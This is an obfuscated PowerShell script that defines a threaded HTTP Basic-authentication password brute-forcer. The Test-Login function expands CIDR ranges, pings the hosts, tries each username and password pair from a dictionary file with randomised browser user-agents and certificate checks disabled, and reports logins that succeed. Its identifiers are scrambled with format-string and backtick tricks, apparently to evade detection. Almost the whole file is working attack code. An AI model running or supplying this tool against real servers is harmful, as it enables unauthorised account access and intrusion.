 &("{1}{2}{0}" -f 'TEm','Se','t-i')  vAriABlE:uBR8  (  [TyPE]("{6}{5}{4}{2}{0}{3}{7}{1}{8}{9}"-F'NIt','sIo','.rUnspaceS.I','i','naGemEnT.AUtomatIOn','ySTeM.ma','S','aLses','NsT','aTe') );   &('SV') XyA ( [TYpe]("{3}{1}{4}{2}{0}" -f 'hREaDIng.tHREad','sTE','.t','sY','m') ) ;  &("{0}{1}{2}"-f's','ET-iT','EM') vAriabLe:haE  ( [Type]("{3}{2}{1}{0}"-F 'Ctory','FA','e','RUnspac'))  ;   &('sv') ("X6"+"W") ([tyPe]("{1}{0}{2}" -f'OWer','P','sheLL') ) ;  &('SV')  ('V'+'8dPQ')  ([TYPe]("{0}{3}{2}{1}{4}"-F'SYsTe','DD','pA','m.neT.i','RESS')); &('sV')  ('na'+'ukg')  ( [TyPe]("{1}{0}{2}" -f 's','sY','tem.MATh')  ); &("{2}{0}{1}" -f 'e','t-iTeM','s')  ("V"+"A"+"riAbLE:7"+"90"+"I") (  [TyPe]("{1}{3}{2}{0}"-F 'R','SysTeM.biT','eRTe','conv'));   $Gq6 =[tyPe]("{1}{0}"-f 'rAY','aR');  $mlECxH = [typE]("{2}{3}{0}{1}" -f 'oNVER','T','SYstEM.','c') ;    $fNXE1 = [tyPE]("{1}{2}{0}{4}{3}"-f'Em.tEXt','sy','st','ng','.EnCoDi');   $vbgjx  = [typE]("{2}{1}{4}{3}{5}{0}" -F 't','teM.nE','Sys','.web','T','rEQueS');  $ZY0TB=[TYPE]("{0}{2}{5}{6}{3}{7}{4}{8}{1}" -f'Sy','R','sTeM.nET.Se','epo','Nag','rVI','C','IntMa','E') ;  function inv`okE-`T`HrEA`Dedfu`N`ctiON
{
    [CmdletBinding()]
    param (
        [Parameter(PoSitIon = 0, mAndaToRY = ${t`RuE})]
        [String[]]${CompU`T`ErNA`mE},
        [Parameter(POSitiOn = 1, mandATOry = ${tr`UE})]
        [System.Management.Automation.ScriptBlock]${scRI`P`TBL`oCK},
        [Parameter(posiTion = 2)]
        [Hashtable]${ScrIptPa`RA`Met`ERS},
        [Int]${TH`R`EadS} = 20,
        [Int]${Ti`m`EouT} = 100
    )
    
    begin
    {
        
        if (${psbou`NdPA`R`AMET`E`Rs}[("{1}{0}" -f'bug','De')])
        {
            ${dE`BUgpR`e`FerEnce} = ("{2}{0}{1}" -f'on','tinue','C')
        }
        
        &("{2}{0}{1}" -f 'rbos','e','Write-Ve') "[*] Total number of hosts: $($ComputerName.count) "
        
        
        
        ${s`eSSIONs`Ta`Te} =   $UbR8::("{1}{2}{0}"-f 'ault','Cre','ateDef').Invoke()
        ${sE`SS`ioNsta`TE}."apARt`MeNT`S`Ta`Te" =   (  &("{1}{0}"-f 'i','gc')  VariABlE:xyA  ).VAluE::"C`U`RReNtt`hrEAD".("{3}{2}{1}{0}{4}" -f'at','t','artmentS','GetAp','e').Invoke()
        
        
        
        
        
        ${p`Ool} =  (  &("{1}{3}{2}{0}"-f'ARIABlE','ge','-V','T')  haE ).VaLuE::("{4}{2}{5}{1}{0}{3}" -f'c','a','r','ePool','C','eateRunsp').Invoke(1, ${thre`A`ds}, ${sESsi`On`STA`Te}, ${hO`sT})
        ${pO`Ol}.("{0}{1}"-f 'Op','en').Invoke()
        
        ${JO`BS} = @()
        ${p`S} = @()
        ${Wa`iT} = @()
        
        ${CoU`Nter} = 0
    }
    
    process
    {
        
        ForEach (${c`Om`PuteR} in ${co`MPUteR`N`A`Me})
        {
            
            
            if (${Co`mp`UTeR} -ne '')
            {
                
                While ($(${p`OoL}.("{1}{0}{2}{4}{3}" -f'Avai','Get','lableRunsp','s','ace').Invoke()) -le 0)
                {
                    &("{0}{2}{3}{1}" -f'S','eep','tart-','Sl') -MilliSeconds ${ti`mEO`Ut}
                }
                
                
                ${pS} +=   $X6w::("{0}{2}{1}"-f'c','e','reat').Invoke()
                ${Ps}[${cO`U`NtER}]."R`UnSP`A`CepoOL" = ${PO`OL}
                
                
                ${nu`ll} = ${P`s}[${CO`Un`Ter}].("{1}{0}{2}" -f'd','Ad','Script').Invoke(${SC`RIpTBl`o`CK}).("{2}{3}{1}{0}"-f'er','et','AddPar','am').Invoke(("{0}{3}{2}{1}" -f'C','ame','erN','omput'), ${C`oMpUtEr})
                if (${S`c`R`iPtpArAmeT`e`RS})
                {
                    ForEach (${P`ARaM} in ${s`crIp`Tp`AraMe`TERs}.("{1}{3}{2}{0}"-f 'ator','GetEn','er','um').Invoke())
                    {
                        ${NU`lL} = ${P`S}[${couNt`er}].("{1}{2}{0}"-f 'r','AddPa','ramete').Invoke(${PA`R`Am}."nA`Me", ${P`AR`AM}."v`Alue")
                    }
                }
                
                
                ${jO`Bs} += ${ps}[${CoUn`T`er}].("{0}{1}{2}"-f 'Be','g','inInvoke').Invoke();
                
                
                ${WA`it} += ${J`OBs}[${CoUn`T`Er}]."AsYNcwAITH`A`ND`Le"
            }
            ${CoUn`T`er} = ${c`OuN`TER} + 1
        }
    }
    
    end
    {
        
        &("{0}{2}{3}{1}{4}" -f'W','Verb','rit','e-','ose') ("{8}{6}{11}{3}{0}{1}{10}{4}{7}{2}{9}{5}" -f ' s','can','read','ing for','ing t','sh...','a','h','W','s to fini','n','it')
        ${wAI`T`TimeO`Ut} = &("{1}{0}" -f'et-Date','G')
        
        
        while ($(${j`OBs} | &("{2}{1}{0}{3}" -f 'ere-O','h','W','bject') { ${_}."ISc`Omp`lEteD" -eq ${F`AL`SE} })."c`OUNT" -gt 0 -or $($($(&("{1}{0}"-f 'Date','Get-')) - ${wAI`Tt`ImEOUt})."t`O`TalSeC`OnDS") -gt 60)
        {
            &("{2}{1}{0}" -f'p','e','Start-Sle') -MilliSeconds ${tIME`OUt}
        }
        
        
        for (${Y} = 0; ${y} -lt ${C`oUN`TEr}; ${Y}++)
        {
            
            try
            {
                
                ${ps}[${y}]."EndInV`o`Ke"(${J`obs}[${y}])
                
            }
            catch
            {
                &("{2}{0}{1}"-f 'ite','-Warning','Wr') ('err'+'or:'+' '+"$_")
            }
            finally
            {
                ${p`s}[${y}].("{0}{1}{2}" -f'D','i','spose').Invoke()
            }
        }
        
        ${P`Ool}.("{1}{0}" -f 'pose','Dis').Invoke()
        &("{3}{2}{1}{0}" -f 'se','o','rite-Verb','W') ("{5}{2}{4}{3}{0}{1}"-f 'eads co','mpleted!','l','r','l th','A')
    }
}

function Tes`T-L`OGin

{


    
[CmdletBinding()]

param (
    [Parameter(MANdAtORy = ${Tr`UE})]
    [String]${RHo`S`Ts},
    [Int]${po`RT},
    [String]${d`IReCt`ORY},
    [String]${DicTI`On`ARy},
    [String]${U`sERN`AMe},
    [String]${pas`Swo`Rd},
    [Switch]${U`S`essl},
    [ValidateRange(1, 100)]
    [Int]${th`Re`AdS},
    [Switch]${no`p`iNG}
)
    
    begin
    {   
        ${hoSt`L`ISt} = &("{1}{2}{0}"-f 'ect','Ne','w-Obj') ("{2}{1}{4}{6}{5}{3}{0}"-f'yList','s','Sy','tions.Arra','te','lec','m.Col')
        
        ${iHos`TS} = ${RH`oSts} -split ","
        
        foreach (${IH`osT} in ${IH`oS`TS})
        {
            ${i`hosT} = ${ih`o`sT}.("{0}{1}" -f'Repl','ace').Invoke(" ", "")
            
            if (!${I`H`OSt})
            {
                continue
            }
            
            if (${i`host}.("{2}{1}{0}"-f'ains','t','con').Invoke("/"))
            {
                ${n`Etpart} = ${iho`st}.("{1}{0}"-f 'it','spl').Invoke("/")[0]
                [uint32]${Ma`SKPa`RT} = ${i`H`OsT}.("{1}{0}"-f 't','spli').Invoke("/")[1]
                
                ${a`Dd`ResS} =  ( &("{2}{0}{1}" -f't-varI','AblE','gE') ('V'+'8dpq')  -vALUeOnl)::("{1}{0}"-f 'rse','Pa').Invoke(${n`ETPa`Rt})
                if (${m`As`kpArt} -ge ${aDd`Re`sS}.("{2}{0}{1}" -f'ressB','ytes','GetAdd').Invoke()."l`eNGth" * 8)
                {
                    throw ("{0}{2}{1}{3}{4}" -f 'Ba','s','d ho','t m','ask')
                }
                
                ${NumhO`sTs} =  (&("{1}{0}{2}" -f'LDi','ChI','tEm')  vARIAble:nAUKG).ValUE::("{0}{1}"-f'P','ow').Invoke(2, ((${A`ddrE`ss}.("{3}{2}{0}{1}"-f 'By','tes','ess','GetAddr').Invoke()."LenG`Th" * 8) - ${maS`KPA`RT}))
                
                ${s`T`ARTAdDR`ESs} = ${a`d`dRESS}.("{2}{0}{1}{3}" -f 'e','tAddressByte','G','s').Invoke()
                  (  &("{0}{1}{2}"-f 'vA','RiAb','Le')  Gq6  ).vaLUE::("{1}{2}{0}"-f 'se','Rev','er').Invoke(${S`TAr`TADDresS})
                
                ${ST`ArTadDR`eSS} =   $790i::("{0}{1}"-f 'T','oUInt32').Invoke(${s`T`ARTADdReSS}, 0)
                [uint32]${sTAr`TMA`Sk} = ( $NAUkg::("{0}{1}" -f 'P','ow').Invoke(2, ${m`A`SkPA`Rt}) - 1) * ( $NAUKg::("{0}{1}" -f'P','ow').Invoke(2, (32 - ${MAskp`ARt})))
                ${s`TA`R`TADdREsS} = ${St`Ar`TAdd`R`ess} -band ${sTaR`T`Ma`Sk}
                
                ${STa`RT`AdD`RESS} =  ( &("{0}{3}{2}{1}"-f 'GE','Ble','RIA','t-VA')  ('79'+'0I') -VA )::("{0}{1}{2}" -f'G','etBy','tes').Invoke(${STa`RTa`d`d`ReSs})[0..3]
                 $GQ6::("{2}{1}{0}"-f 'se','er','Rev').Invoke(${sTARTAdd`RE`SS})
                ${a`DDRE`ss} = [System.Net.IPAddress][byte[]]${S`T`ArTaDd`RESS}
                
                ${N`UlL} = ${hosT`LI`ST}.("{0}{1}" -f'A','dd').Invoke(${aD`DRE`Ss}."ipa`dDRESs`T`oStrING")
                
                for (${I} = 0; ${I} -lt ${n`U`m`hoSts} - 1; ${I}++)
                {
                    ${n`eXtaD`drEsS} = ${Ad`d`REsS}.("{3}{1}{0}{2}"-f'By','ss','tes','GetAddre').Invoke()
                      (  &("{2}{1}{0}{3}" -f 'dIt','ET-chil','g','EM') VaRIABle:gQ6 ).VaLue::("{0}{1}" -f'Rev','erse').Invoke(${NeXTAd`drE`SS})
                    ${NE`XtaDdRE`sS} =  ( &("{2}{0}{1}" -f'R','Iable','gEt-va')  790i).VAlUe::("{0}{2}{1}"-f 'ToUIn','32','t').Invoke(${NexTaDD`RE`SS}, 0)
                    ${nExT`A`D`DReSS}++
                    ${NExt`A`dD`RESS} =  (&("{1}{2}{0}"-f 'LE','vA','RIAb') ('79'+'0i')  ).VALue::("{1}{2}{0}" -f 'Bytes','G','et').Invoke(${neXtADd`R`eSS})[0..3]
                     $gQ6::("{2}{1}{0}" -f 'erse','ev','R').Invoke(${n`E`Xt`AdDReSS})
                    ${A`D`DRESs} = [System.Net.IPAddress][byte[]]${NextADd`Re`sS}
                    ${n`ULl} = ${h`ost`LiST}.("{1}{0}" -f 'dd','A').Invoke(${a`dDre`Ss}."ipA`DDRess`T`o`strI`Ng")  
                }            
            }
            else
            {
                ${n`Ull} = ${h`OSTL`iSt}.("{0}{1}"-f 'A','dd').Invoke(${i`h`oST}) 
            }
        }

        function GET-`U`SerAgEnt {
          
          ${Ua`stri`Ng} = @(((("{5}{7}{20}{9}{12}{13}{2}{3}{16}{0}{19}{1}{8}{17}{15}{18}{11}{14}{6}{10}{4}"-f '.1',' W','ow','s N','fox/40.1)','Moz','01 Fir','il','O','a/5.0 ','e','v:40.0','(','Wind',') Gecko/201001','4;','T 6','W6',' r',';','l'))),
          ("{12}{16}{7}{13}{8}{2}{11}{3}{14}{5}{9}{15}{0}{6}{4}{10}{1}" -f 'ecko/2','36.0','ws ','.','0','; rv:36','01001','ll','.0 (Windo','.','1 Firefox/','NT 6','M','a/5','3','0) G','ozi'),
          (("{7}{16}{12}{19}{1}{18}{2}{15}{14}{17}{9}{5}{13}{11}{10}{3}{0}{4}{8}{6}" -f'1.0) li','dows NT','.1; WOW64; Trid','1','ke Ge','.0','ko','Mo','c','7','S; rv:','A','(','; ','t','en','zilla/5.0 ','/',' 6','Win')),
          ("{14}{17}{5}{11}{10}{19}{3}{15}{1}{13}{25}{4}{8}{0}{18}{6}{24}{12}{20}{16}{9}{21}{7}{22}{2}{23}" -f' ','MSI','; e','mpat','; Window','z','.','ident/','s','.1.','.0','illa/5','Path.3; .NE','E ','M','ible; ','R 3','o','NT 7',' (co','T CL','40767; Tr','6.0','n-IN)','0; Info','10.0'),
          ("{3}{8}{1}{2}{16}{15}{0}{13}{14}{12}{6}{11}{7}{10}{4}{9}{5}" -f'0 (X11; ','ra','/','O','i','.16','/14.10) P','2','pe','on/12','.12.388 Vers','resto/','6; Ubuntu','Linux ','i68','.8','9'),
          (("{8}{9}{0}{6}{3}{5}{2}{1}{7}{4}" -f'ndows NT 6.','388 Version/1','12.','resto/2','.14','.','0) P','2','Opera/9.80',' (Wi')),
          ((("{8}{1}{6}{18}{14}{15}{22}{11}{0}{9}{20}{19}{17}{7}{23}{16}{24}{3}{21}{10}{12}{5}{4}{2}{13}" -f 'sh; Intel Mac OS X','o','/7046A','ML, like ','.3 Safari','0','z','bKit/','M',' 10_9_3) ','o) Vers','Macinto','ion/7.','194A','l','la/5.','7.','e','i','W','Apple','Geck','0 (','53','75.14 (KHT'))),
          (("{8}{12}{16}{1}{5}{4}{11}{9}{18}{15}{0}{21}{13}{3}{2}{19}{7}{6}{17}{20}{22}{14}{10}" -f' ',' Inte','53','/','c','l Ma','ko) V','+ (KHTML, like Gec','Mozi','OS X 10_6_','57.2',' ','lla/5.0','eWebKit','.',')',' (Macintosh;','ersion/','8','7.13','5.1.7 Safari/','Appl','534')),
          ("{8}{11}{13}{3}{12}{7}{2}{9}{4}{0}{14}{6}{16}{10}{15}{1}{5}" -f 'ire','7.','7.0','; r','02 F','0.1','7.0 Icewea',':1','Mozilla/5.0 (X1',') Gecko/201212','l','1','v','; Linux x86_64','fox/1','/1','se'))

          ${ScripT:`U`Serag`EnT} = &("{0}{1}{2}"-f'Get-R','an','dom') -Input ${Ua`st`RINg}
            
        }

        function tE`st-Pass`Word {
                param (
                    [Parameter(MaNDaTORY = ${tR`UE})]
                    [String]${co`m`PUtERN`AME},
                    [Int]${PO`Rt},
                    [String]${d`IrEcT`o`RY},
                    [String]${uSe`RN`Ame},
                    [String]${P`AssW`oRd},
                    [String]${s`sL}
                )
                ${p`AIr} = "$($UserName):$($Password)"
                ${EnCo`de`d`creds} =  (  &("{0}{1}" -f'GC','I')  ("VaRi"+"Able"+":M"+"l"+"EcXh")  ).vaLue::"T`oBAse64s`T`RINg"(  (&("{0}{1}"-f 'I','TEM') ("vA"+"RIaBle"+":FNXE1")  ).ValUE::"aS`CII".("{0}{1}{2}" -f 'Ge','tByt','es').Invoke(${p`Air}))
                ${bAsIC`AUThv`A`Lue} = ('Bas'+'ic '+"$encodedCreds")
                
                
                foreach (${Ta`Rg`et} in ${C`oMP`U`TerNamE})
                {
                    try {
                        &("{0}{1}{2}"-f 'Ge','t-User','Agent')
                        ${wE`Bt`AR`gEt} = "http$($SSL)://$($Target)$($PortNum)$($Directory)"
                        ${u`Ri} = &("{1}{2}{0}" -f'ject','New','-Ob') ("{0}{1}"-f 'U','ri')(${WEBTA`R`GeT})                    
                        ${WEbReq`UE`sT} =   $VbGJx::("{1}{0}"-f 'e','Creat').Invoke(${u`Ri})
                        ${w`EbreQu`EsT}."p`ReAu`T`hentICatE"=${t`RuE}
                        ${WE`B`RE`qUeSt}."ALLoWAUtoR`e`DiR`Ect"=${FA`L`se}
                        ${wEB`REQU`eST}."T`ime`OUt" = 5000
                        ${WeBr`e`Q`UESt}."kee`palIvE"=${tR`UE}
                        ${w`e`B`ReQuEsT}."ME`T`hOD" = "GET"
                        ${wE`B`REQUEST}."He`Ade`RS".("{0}{1}"-f 'A','dd').Invoke(("{0}{1}{2}" -f'Use','rAge','nt'), ${ScriP`T:uSeRa`Ge`NT})
                        ${wEBREqu`E`St}."h`EaDers".("{0}{1}"-f'Ad','d').Invoke(("{1}{0}{3}{2}" -f'thor','Au','tion','iza'), ${b`AsICA`UTH`VAlUE});
                        ${W`eb`REQueSt}."HEa`d`eRs".("{0}{1}"-f'A','dd').Invoke(("{4}{2}{1}{3}{0}"-f' 300','-Al','eep','ive:','K'));
                        ${weB`ReSpO`N`sE} = ${W`eBrEQU`e`ST}.("{2}{3}{0}{1}"-f's','e','GetRe','spon').Invoke()
                        ${WebStA`T`US} = ${we`BResPon`se}."St`A`TuscODE"
                    
                        If (${wE`B`Res`poNSe}."sTAtUSc`o`De" -eq "OK")
                        {
                            
                            &("{1}{3}{2}{0}" -f 'utput','W','O','rite-') "[*] Possible successfull login with $($Username):$($Password) at $URI "
                        }

                    } catch {
                        ${W`eb`STatUs} = ${ERR`oR}[0]."EX`cEPtI`On"."iNN`erexc`EPti`oN"."rEspO`N`se"."sT`AtU`Scode"
                        if (${wE`BsTat`US} -eq ${nu`Ll}) {
                            
                            
                            ${W`eb`s`TATUs} = ${eR`ROr}[0]."eXC`EPT`iOn"."I`NNErE`X`C`ePTIOn"."S`TATUs"
                        }
                    }              
                }
            }
            
        ${hoSt`EnUMbL`o`cK} = {
            param(${comP`U`Te`RnaME}, ${usE`s`SL}, ${po`RT}, ${u`sErn`Ame}, ${p`ASsW`O`RD}, ${d`iRECto`Ry}, ${d`IctI`oNARY})
            
            if (${uS`e`sSl} -and ${PO`Rt} -eq 0)
            {
                
                ${Po`Rt} = 443
            }
            elseif (${po`RT} -eq 0)
            {
                
                ${Po`RT} = 80
            }
            
            
            if (${UsEs`Sl})
            {
                ${s`sl} = 's'
                
                  ( &("{2}{0}{1}" -f 'L','E','VaRiAB') ZY0tB  -vAlueon  )::"seR`VercerTiFicat`e`VaL`I`D`ATiO`NcA`Ll`BAcK" = { ${t`RuE} }
            }
            else
            {
                ${S`sL} = ''
            }
            
            if ((${po`Rt} -eq 80) -or (${P`orT} -eq 443))
            {
                ${PO`R`Tnum} = ''
            }
            else
            {
                ${pOr`T`NUM} = ":$Port"
            }

            if (${DI`Cti`oN`ARy}) {
                if (&("{0}{2}{1}" -f 'Test','h','-Pat') -Path ${dI`cTIO`N`ARY}) {
                    foreach (${iT`em} in &("{2}{1}{3}{0}"-f 'nt','t-Con','Ge','te') ${Di`cT`I`oNaRy}) {
                        ${paSS`W`orD} = ${IT`eM}
                        &("{0}{3}{1}{2}" -f'Te','Passwor','d','st-') -ComputerName ${C`O`m`PutErnaME} -Port ${p`Ort} -Directory ${dirE`c`TORY} -UserName ${Us`Er`NamE} -Password ${Pa`Ss`WORd} -SSL ${S`SL}
                    }
                }
                else {
                    &("{2}{1}{0}"-f 'Warning','te-','Wri') ('[!]'+' '+'D'+'iction'+'ar'+'y '+'fil'+'e '+"'$Dictionary' "+'n'+'ot '+'fou'+'nd!')
                }
                
            }
            else {
                &("{1}{0}{2}" -f 'est-Passw','T','ord') -ComputerName ${Comp`Utern`AMe} -Port ${pO`Rt} -Directory ${Di`R`ECToRy} -UserName ${USe`R`NAME} -Password ${p`AsSW`O`Rd} -SSL ${S`sL}
            }
        }
    }

    process {

        if(-not ${n`OPinG} -and (${ho`S`TlIst}."cOU`Nt" -ne 1)) {
            
            ${P`InG} = {param(${Co`mPuterNA`mE}) if(&("{2}{3}{0}{1}{4}"-f '-C','onnec','Tes','t','tion') -ComputerName ${cO`mPu`TeRn`AMe} -Count 1 -Quiet -ErrorAction ("{1}{0}"-f 'p','Sto')){${coMpu`TerN`AME}}}
            ${H`oS`TlIsT} = &("{4}{6}{0}{5}{2}{1}{3}"-f'-Thread','o','uncti','n','Invok','edF','e') -ComputerName ${H`O`stlI`sT} -ScriptBlock ${p`inG} -Threads 100
        }

        if(${THr`Eads}) {
            &("{0}{2}{1}"-f 'W','e-Verbose','rit') ('U'+'sing '+'thre'+'adin'+'g '+'with'+' '+'t'+'hre'+'ads '+'= '+"$Threads")

            
            ${S`CRi`p`TparamS} = @{

                ("{0}{1}" -f'UseSS','L') = ${usES`sl}
                ("{1}{0}"-f't','Por') = ${Po`Rt}
                ("{0}{2}{1}"-f 'U','rName','se') = ${U`SeR`NAmE}
                ("{1}{0}{2}"-f 'sW','Pas','ord') = ${PAs`sw`Ord}
                ("{2}{0}{1}"-f'rect','ory','Di') = ${Dir`EC`ToRY}
                ("{0}{2}{1}" -f 'D','ionary','ict') = ${DIC`T`i`OnarY}
            }

            
            &("{5}{1}{6}{2}{0}{4}{3}"-f 'uncti','oke-Threa','edF','n','o','Inv','d') -ComputerName ${HOST`l`IST} -ScriptBlock ${HOS`TE`NUMbl`o`CK} -ScriptParameters ${S`CRI`pTparams}
        }

        else {
            ${c`oMp`Utern`A`Me} = ${RhO`sTS}
            &("{0}{1}{2}"-f'Invo','ke','-Command') -ScriptBlock ${hos`Te`N`UmblOck} -ArgumentList ${COM`PutE`RN`Ame}, ${u`SEssl}, ${p`ORt}, ${USE`RNa`ME}, ${paSsw`o`Rd}, ${DIR`EC`To`RY}, ${dI`Ct`iOnarY}
        }
    }
}